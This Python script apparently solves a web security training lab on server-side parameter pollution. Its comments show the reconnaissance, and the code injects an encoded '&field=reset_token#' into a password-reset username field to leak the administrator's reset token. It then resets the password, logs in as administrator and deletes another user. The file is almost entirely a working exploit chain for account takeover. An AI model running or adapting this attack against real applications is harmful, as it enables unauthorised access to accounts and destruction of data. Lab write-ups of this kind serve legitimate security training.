'''
To solve the lab, log in as the administrator and delete carlos. 
'''

import requests
from bs4 import BeautifulSoup

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0acb00ce042cface803a260500c600ae.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False


'''
Try adding second parameter - url_encode(&) 
- username=administrator%26x=y - Error: Parameter is not supported

Try truncate server-side query string - url_encode(#)
- username=administrator%23 - Error: Field not specified
- server-side query string param found - field

Fuzz for valid param values of field - email
- username=administrator%26field=FUZZ%23 - Original resp of username=administrator returned

Inspect /static/js/forgotPassword.js
- password reset endpoint /forgot-password?reset_token=${resetToken}

Test field=reset_token
- username=administrator%26field=reset_token%23
- example JSON response
    {"result":"ulvy2a75sqe098ietb6etcr7o8skeho1","type":"reset_token"}
'''
# forgot-password to create reset_token for administrator
r = s.get(f"{url}/forgot-password")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'administrator',
}

r = s.post(f"{url}/forgot-password", data=payload)
print(r.json())

# Get password reset token
payload = {
    'csrf':csrf,
    'username':'administrator&field=reset_token#',
}

r = s.post(f"{url}/forgot-password", data=payload)
reset_token = r.json()['result']
print(r.json())


# Reset password via reset_token
payload = {
    'csrf':csrf,
    'reset_token':reset_token,
    'new-password-1':123456,
    'new-password-2':123456
}

r = s.post(f"{url}/forgot-password/reset_token={reset_token}", data=payload)

# login as administrator
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'administrator',
    'password':'123456'
}

s.post(f"{url}/login", data=payload)

# delete carlos
r = s.get(f"{url}/admin/delete", params={'username':'carlos'})


